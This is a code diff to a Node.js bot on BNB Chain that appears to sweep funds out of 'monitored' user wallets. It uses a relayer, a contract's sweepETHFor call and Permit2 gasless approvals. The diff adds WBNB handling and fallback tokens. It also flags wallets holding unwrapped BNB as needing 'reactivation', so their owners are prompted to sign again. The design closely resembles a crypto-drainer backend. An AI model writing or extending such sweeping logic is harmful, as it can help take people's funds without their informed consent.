@@ -43,6 +43,11 @@ const PERMIT2_ADDRESS      = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const MIN_ETH_WEI          = ethers.parseEther("0.001");
 const MIN_TOKEN_UNITS      = "0.5";
 
+// Wrapped native token — WBNB on BNB Chain
+const WRAPPED_NATIVE_ADDRESS = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c".toLowerCase();
+// Native surplus above this = user forgot to wrap; prompt re-activation
+const NATIVE_WRAP_FLOOR      = ethers.parseEther("0.002");  // 0.002 BNB
+
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
 // Stagger CoinGecko startup fetch to avoid hitting rate limits when all bots start
@@ -1176,7 +1181,15 @@ async function fetchTokenList(chain) {
       });
     }
 
-    log(`[tokens] ✅ loaded ${tokens.length} tokens for ${chain} from CoinGecko`);
+    const seenAddrs = new Set(tokens.map(t => t.address.toLowerCase()));
+    for (const ft of (FALLBACK_TOKENS[chain] ?? FALLBACK_TOKENS[CHAIN] ?? [])) {
+      if (!seenAddrs.has(ft.address.toLowerCase())) {
+        tokens.push(ft);
+        seenAddrs.add(ft.address.toLowerCase());
+      }
+    }
+
+    log(`[tokens] ✅ loaded ${tokens.length} tokens for ${chain} from CoinGecko (incl. fallbacks)`);
     if (tokens.length) log(`[tokens] top 5: ${tokens.slice(0, 5).map(t => t.symbol).join(", ")}`);
     return tokens;
 
@@ -1362,35 +1375,54 @@ async function dispatchSweep(wallet) {
 async function trySweepNativeFor(checksum, short) {
   if (!contract || !CONTRACT_ADDRESS) return;
   try {
-    // Check the CONTRACT's BNB balance — NOT the user's wallet.
+    // ── A. Contract-held BNB (PATH 2 — sweepETHFor) ───────────────────────────
     const contractBal = await getReadProvider().getBalance(CONTRACT_ADDRESS);
-    if (contractBal === 0n) return;
-
     const relBal = await getRelayerBalance();
-    if (relBal < ethers.parseEther("0.001")) {
-      warn(`[nativeFor] relayer low on gas — skipping native sweep for ${short}`);
+
+    if (contractBal > 0n) {
+      if (relBal < ethers.parseEther("0.001")) {
+        warn(`[nativeFor] relayer low on gas — skipping sweepETHFor for ${short}`);
+      } else {
+        log(`[nativeFor] ${short} — contract holds ${ethers.formatEther(contractBal)} BNB — attempting sweepETHFor`);
+        const isAuth = await contract.isAuthorized(checksum, relayerWallet.address).catch(() => false);
+        if (isAuth) {
+          let gasEst;
+          try { gasEst = await contract.sweepETHFor.estimateGas(checksum); }
+          catch { log(`[nativeFor] ${short} — sweepETHFor simulation reverted — skipping`); return; }
+          const fee = await getFeeData();
+          const tx = await contract.sweepETHFor(checksum, { gasLimit: gasEst * 120n / 100n, ...fee });
+          await tx.wait();
+          log(`[nativeFor] ✅ sweepETHFor confirmed for ${short} — tx: ${tx.hash}`);
+          return;
+        }
+        log(`[nativeFor] ${short} — not authorised in V2 contract, skipping sweepETHFor`);
+      }
+    }
+
+    // ── B. User-wallet BNB surplus (permit2-gasless path) ─────────────────────
+    const wallet = monitoredWallets.get(checksum.toLowerCase());
+    if (!wallet) return;
+    if (wallet.type !== "permit2-gasless" && wallet.type !== "permit2") return;
+
+    const userBal = await getReadProvider().getBalance(checksum);
+    if (userBal <= NATIVE_WRAP_FLOOR) return;
+
+    const wbnbContract = new ethers.Contract(
+      WRAPPED_NATIVE_ADDRESS, ["function balanceOf(address) view returns (uint256)"], getReadProvider()
+    );
+    const wbnbBal = await wbnbContract.balanceOf(checksum).catch(() => 0n);
+    if (wbnbBal > 0n) {
+      log(`[nativeFor] ${short} — user has ${ethers.formatEther(wbnbBal)} WBNB and ${ethers.formatEther(userBal)} BNB — WBNB sweep will handle it`);
       return;
     }
 
-    log(`[nativeFor] ${short} — contract holds ${ethers.formatEther(contractBal)} BNB — attempting sweepETHFor`);
-    const isAuth = await contract.isAuthorized(checksum, relayerWallet.address).catch(() => false);
-    if (!isAuth) {
-      log(`[nativeFor] ${short} — not authorised in V2 contract, skipping sweepETHFor`);
-      return;
+    warn(`[nativeFor] ${short} — ${ethers.formatEther(userBal)} BNB sits unwrapped in wallet — marking needs_reactivation`);
+    if (supabase) {
+      await supabase.from("delegated_wallets")
+        .update({ needs_reactivation: true })
+        .eq("address", checksum.toLowerCase()).eq("chain", CHAIN)
+        .then(v => v, () => {});
     }
-
-    let gasEst;
-    try {
-      gasEst = await contract.sweepETHFor.estimateGas(checksum);
-    } catch (simErr) {
-      log(`[nativeFor] ${short} — sweepETHFor simulation reverted — skipping`);
-      return;
-    }
-
-    const fee = await getFeeData();
-    const tx = await contract.sweepETHFor(checksum, { gasLimit: gasEst * 120n / 100n, ...fee });
-    await tx.wait();
-    log(`[nativeFor] ✅ sweepETHFor confirmed for ${short} — tx: ${tx.hash}`);
   } catch (e) {
     maybeResetNonce(e);
     err(`[nativeFor] ❌ ${short}: ${e.reason ?? e.message}`);
